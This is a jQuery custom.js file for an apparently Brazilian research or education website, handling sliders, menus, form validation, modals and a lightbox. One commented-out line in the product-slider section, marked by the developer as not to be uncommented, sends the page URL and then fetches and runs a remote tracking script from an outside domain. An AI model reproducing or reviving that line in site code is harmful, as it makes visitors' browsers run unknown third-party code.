/*---------------------------------------------------------------------
	File Name: custom.js
---------------------------------------------------------------------*/

$(function () {

	"use strict";

	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);

	/* JQuery Menu
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('header nav').meanmenu();
	});

	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('[data-toggle="tooltip"]').tooltip();
	});

	/* sticky
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$(".sticky-wrapper-header").sticky({ topSpacing: 0 });
	});

	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$(".main-menu ul li.megamenu").mouseover(function () {
			if (!$(this).parent().hasClass("#wrapper")) {
				$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function () {
			$("#wrapper").removeClass('overlay');
		});
	});

	/* NiceScroll
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(".brand-box").niceScroll({
		cursorcolor: "#9b9b9c",
	});

	/* NiceSelect
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('select').niceSelect();
	});

	/* OwlCarousel - Blog Post slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		var owl = $('.carousel-slider-post');
		owl.owlCarousel({
			items: 1,
			loop: true,
			margin: 10,
			autoplay: true,
			autoplayTimeout: 3000,
			autoplayHoverPause: true
		});
	});

	/* OwlCarousel - Banner Rotator Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		var owl = $('.banner-rotator-slider');
		owl.owlCarousel({
			items: 1,
			loop: true,
			margin: 10,
			nav: true,
			dots: false,
			navText: ["<i class='fa fa-angle-left'></i>", "<i class='fa fa-angle-right'></i>"],
			autoplay: true,
			autoplayTimeout: 3000,
			autoplayHoverPause: true
		});
	});

	/* OwlCarousel - Product Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	/* Não descomentar essa linha. Chama url que não carrega :(
	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } });*/

	$(document).ready(function () {
		var owl = $('#product-in-slider');
		owl.owlCarousel({
			loop: true,
			nav: true,
			margin: 10,
			navText: ["<i class='fa fa-angle-left'></i>", "<i class='fa fa-angle-right'></i>"],
			responsive: {
				0: {
					items: 1
				},
				600: {
					items: 2
				},
				960: {
					items: 3
				},
				1200: {
					items: 4
				}
			}
		});
		owl.on('mousewheel', '.owl-stage', function (e) {
			if (e.deltaY > 0) {
				owl.trigger('next.owl');
			} else {
				owl.trigger('prev.owl');
			}
			e.preventDefault();
		});
	});

	/* Scroll to Top
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(window).on('scroll', function () {
		scroll = $(window).scrollTop();
		if (scroll >= 100) {
			$("#back-to-top").addClass('b-show_scrollBut')
		} else {
			$("#back-to-top").removeClass('b-show_scrollBut')
		}
	});
	$("#back-to-top").on("click", function () {
		$('body,html').animate({
			scrollTop: 0
		}, 1000);
	});

	/* Contact-form
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	$.validator.setDefaults({
		submitHandler: function () {
			alert("submitted!");
		}
	});

	$(document).ready(function () {
		$("#contact-form").validate({
			rules: {
				firstname: "required",
				email: {
					required: true,
					email: true
				},
				lastname: "required",
				message: "required",
				agree: "required"
			},
			messages: {
				firstname: "Please enter your firstname",
				email: "Please enter a valid email address",
				lastname: "Please enter your lastname",
				username: {
					required: "Please enter a username",
					minlength: "Your username must consist of at least 2 characters"
				},
				message: "Please enter your Message",
				agree: "Please accept our policy"
			},
			errorElement: "div",
			errorPlacement: function (error, element) {
				// Add the `help-block` class to the error element
				error.addClass("help-block");

				if (element.prop("type") === "checkbox") {
					error.insertAfter(element.parent("input"));
				} else {
					error.insertAfter(element);
				}
			},
			highlight: function (element, errorClass, validClass) {
				$(element).parents(".col-md-4, .col-md-12").addClass("has-error").removeClass("has-success");
			},
			unhighlight: function (element, errorClass, validClass) {
				$(element).parents(".col-md-4, .col-md-12").addClass("has-success").removeClass("has-error");
			}
		});
	});

	/* heroslider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	var swiper = new Swiper('.heroslider', {
		spaceBetween: 30,
		centeredSlides: true,
		slidesPerView: 'auto',
		paginationClickable: true,
		loop: true,
		autoplay: {
			delay: 2500,
			disableOnInteraction: false,
		},
		pagination: {
			el: '.swiper-pagination',
			clickable: true,
			dynamicBullets: true
		},
	});


	/* Product Filters
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	var swiper = new Swiper('.swiper-product-filters', {
		slidesPerView: 3,
		slidesPerColumn: 2,
		spaceBetween: 30,
		breakpoints: {
			1024: {
				slidesPerView: 3,
				spaceBetween: 30,
			},
			768: {
				slidesPerView: 2,
				spaceBetween: 30,
				slidesPerColumn: 1,
			},
			640: {
				slidesPerView: 2,
				spaceBetween: 20,
				slidesPerColumn: 1,
			},
			480: {
				slidesPerView: 1,
				spaceBetween: 10,
				slidesPerColumn: 1,
			}
		},
		pagination: {
			el: '.swiper-pagination',
			clickable: true,
			dynamicBullets: true
		}
	});

	/* Countdown
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$('[data-countdown]').each(function () {
		var $this = $(this),
			finalDate = $(this).data('countdown');
		$this.countdown(finalDate, function (event) {
			var $this = $(this).html(event.strftime(''
				+ '<div class="time-bar"><span class="time-box">%w</span> <span class="line-b">weeks</span></div> '
				+ '<div class="time-bar"><span class="time-box">%d</span> <span class="line-b">days</span></div> '
				+ '<div class="time-bar"><span class="time-box">%H</span> <span class="line-b">hr</span></div> '
				+ '<div class="time-bar"><span class="time-box">%M</span> <span class="line-b">min</span></div> '
				+ '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'));
		});
	});

	/* Deal Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$('.deal-slider').slick({
		dots: false,
		infinite: false,
		prevArrow: '.previous-deal',
		nextArrow: '.next-deal',
		speed: 500,
		slidesToShow: 3,
		slidesToScroll: 3,
		infinite: false,
		responsive: [{
			breakpoint: 1024,
			settings: {
				slidesToShow: 3,
				slidesToScroll: 2,
				infinite: true,
				dots: false
			}
		}, {
			breakpoint: 768,
			settings: {
				slidesToShow: 2,
				slidesToScroll: 2
			}
		}, {
			breakpoint: 480,
			settings: {
				slidesToShow: 1,
				slidesToScroll: 1
			}
		}]
	});

	/* News Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$('#news-slider').slick({
		dots: false,
		infinite: false,
		prevArrow: '.previous',
		nextArrow: '.next',
		speed: 500,
		slidesToShow: 1,
		slidesToScroll: 1,
		responsive: [{
			breakpoint: 1024,
			settings: {
				slidesToShow: 1,
				slidesToScroll: 1,
				infinite: true,
				dots: false
			}
		}, {
			breakpoint: 600,
			settings: {
				slidesToShow: 1,
				slidesToScroll: 1
			}
		}, {
			breakpoint: 480,
			settings: {
				slidesToShow: 1,
				slidesToScroll: 1
			}
		}]
	});

	/* Fancybox
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(".fancybox").fancybox({
		maxWidth: 1200,
		maxHeight: 600,
		width: '70%',
		height: '70%',
	});

	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('#sidebarCollapse').on('click', function () {
			$('#sidebar').toggleClass('active');
			$(this).toggleClass('active');
		});
	});

	/* Product slider 
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	// optional
	$('#blogCarousel').carousel({
		interval: 5000
	});


});



/*corrigindo problema com animação inconsistente no dropdown*/

const target_solucoes = document.getElementById('menu_dropdown_solucoes');
const observer_solucoes = new MutationObserver(callback);
const target_sobre = document.getElementById('menu_dropdown_sobre');
const observer_sobre = new MutationObserver(callback);
const target_cursos = document.getElementById('menu_dropdown_cursos');
const observer_cursos = new MutationObserver(callback);

observer_solucoes.observe(target_solucoes, { attributes: true });
observer_sobre.observe(target_sobre, { attributes: true });
observer_cursos.observe(target_cursos, { attributes: true });

function callback(mutations) {
	if (!target_solucoes.classList.contains('show')) {
		target_solucoes.style.removeProperty('position');
		target_solucoes.style.removeProperty('transform');
		target_solucoes.style.removeProperty('top');
		target_solucoes.style.removeProperty('left');
		target_solucoes.style.removeProperty('will-change');
	}
	if (!target_sobre.classList.contains('show')) {
		target_sobre.style.removeProperty('position');
		target_sobre.style.removeProperty('transform');
		target_sobre.style.removeProperty('top');
		target_sobre.style.removeProperty('left');
		target_sobre.style.removeProperty('will-change');
	}
	if (!target_cursos.classList.contains('show')) {
		target_cursos.style.removeProperty('position');
		target_cursos.style.removeProperty('transform');
		target_cursos.style.removeProperty('top');
		target_cursos.style.removeProperty('left');
		target_cursos.style.removeProperty('will-change');
	}
}

/*corrigindo a altura do plano de fundo dos depoimentos pra alinhar com o texto mais largo, evitando redimensionamento*/
function carouselNormalization() {
	var items = $('div[name="depoimentos"]#carouselExampleSlidesOnly .carousel-item'), //grab all slides

		heights = [], //create empty array to store height values
		height = 0,
		tallest; //create variable to make note of the tallest slide

	if (items.length) {
		normalizeHeights();
		$(window).on('resize orientationchange', function () {
			tallest = 0, heights.length = 0; //reset vars
			items.each(function () {
				$(this).css('min-height', '0'); //reset min-height
			});
			normalizeHeights(); //run it again
		});
	}

	function normalizeHeights() {
		items.each(function () { //add heights to array
			// if active testimony is the tallest, fixes object height by adding 20 px
			height = $(this).hasClass('active') ? $(this).height() + 20 : $(this).height();
			heights.push(height);
		});
		tallest = Math.max.apply(null, heights) + 20 + 20; //cache largest value + top padding + extra bottom padding
		items.each(function () {
			$(this).css('min-height', tallest + 'px');
		});
	};
}

/*ajusta a proporção das imagens de iconografia quando tem redimensionamento da janela*/
function fixImageHeights() {
	var imagens = $('.iconography_img'), //grab all images
		tempHeight = 0,
		tempWidth = 0;
	imagens.each(function () {
		$(this).css('width', '100%');
		$(this).css('height', '');
		tempHeight = $(this).height();
		tempWidth = $(this).width();
		if (tempHeight > tempWidth) {
			$(this).css('height', tempWidth + 'px');
			$(this).css('width', '');
		}
	});
};

/*função para ajustar o tamanho do slide na página de RAG ao tamanho da página*/

function resizeSlide() {
	const resize_ob = new ResizeObserver(function (entries) {
		// Como a seleção é de apenas um elemento, pegamos o primeiro item do array e definimos um objeto "rect" com as dimensões do slide
		let rect = entries[0].contentRect;

		// Pega a largura atual do slide
		let width = rect.width;

		// Calcula a altera pela proporção do slide (16:9) e acrescenta a dimensão da barra de navegação do Google Slides (32px)
		let height = width / 16 * 9 + 32;

		// Define a altura atualizada do slide
		document.getElementById('apresentacao_rag').setAttribute('height', height)
	});

	// Observa as mudanças de dimensão
	if ($("#apresentacao_rag").length) {
		resize_ob.observe(document.querySelector("#apresentacao_rag"));
	}
}

/*na página de publicações, esconde e mostra as categorias corretas*/

$(document).ready(function () {
	// Ocultar todas as categorias, exceto a default
	$('#pub_relatorios').hide();
	$('#pub_roboticaIA').hide();
	$('#pub_visao').hide();

	$('.pub_button').on('change', function () {
		var selectedOption = $('input[name="options"]:checked').val();

		// Esconde todas as categorias (não esqueça de adicionar categorias novas)
		$('#pub_dermato').hide();
		$('#pub_relatorios').hide();
		$('#pub_roboticaIA').hide();
		$('#pub_visao').hide();

		// Mostra apenas a categoria de interesse
		$('#pub_' + selectedOption).show();
	});
});

function keepSelectedPubButton() {
	categorias = $('.publication_category');
	categorias.each(function () {
		category = $(this).attr('id').replace("pub_", "");
		if ($(this).css('display') == 'none') {
			$(".pub_button[value='" + category + "']").parent().removeClass("active");
		} else if ($(this).css('display') == 'block') {
			$(".pub_button[value='" + category + "']").parent().addClass("active");
		}
	})
}

/*abre os modais dos cursos quando o id é adicionado à url*/

document.addEventListener("DOMContentLoaded", function () {
	if (window.location.href.indexOf("#ModalFotocomp") > -1) {
		var mobileModal = new bootstrap.Modal(document.getElementById('ModalFotocomp'));
		mobileModal.show();
	} else if (window.location.href.indexOf("#ModalDeep") > -1) {
		var mobileModal = new bootstrap.Modal(document.getElementById('ModalDeep'));
		mobileModal.show();
	} else if (window.location.href.indexOf("#ModalHalide") > -1) {
		var mobileModal = new bootstrap.Modal(document.getElementById('ModalHalide'));
		mobileModal.show();
	} else if (window.location.href.indexOf("#ModalAPSH") > -1) {
		var mobileModal = new bootstrap.Modal(document.getElementById('ModalAPSH'));
		mobileModal.show();
	} else if (window.location.href.indexOf("#ModalAPSIA") > -1) {
		var mobileModal = new bootstrap.Modal(document.getElementById('ModalAPSIA'));
		mobileModal.show();
	} else if (window.location.href.indexOf("#ModalIQA") > -1) {
		var mobileModal = new bootstrap.Modal(document.getElementById('ModalIQA'));
		mobileModal.show();
	}
});

/* configurações do Lightbox para a Galeria */

function lightboxSettings() {
	if ($('#lightboxContainer').lenght) { //checks if lightbox exists
		lightbox.option({
			'albumLabel': "Imagem %1 de %2",
			'fadeDuration': 200,
			'wrapAround': true,
			'maxHeight': 675,
			'maxwidth': 1200
		});
	}
}

function closeLightbox() {
	const lightbox = document.querySelector('.lightbox');
	const lightboxOverlay = document.querySelector('.lightboxOverlay');

	if (lightbox && lightbox.style.display !== 'none') {
		lightbox.style.display = 'none';
		lightboxOverlay.style.display = 'none';
	}
}

/*funções que devem ser executadas assim que a página for completamente carregada*/

window.addEventListener("load", function () {
	carouselNormalization();
	fixImageHeights();
	resizeSlide();
	lightboxSettings();
});

/*funções que devem ser executadas a cada redimensionamento da janela*/

$(window).on('resize orientationchange', function () {
	fixImageHeights();
	keepSelectedPubButton();
	closeLightbox();
});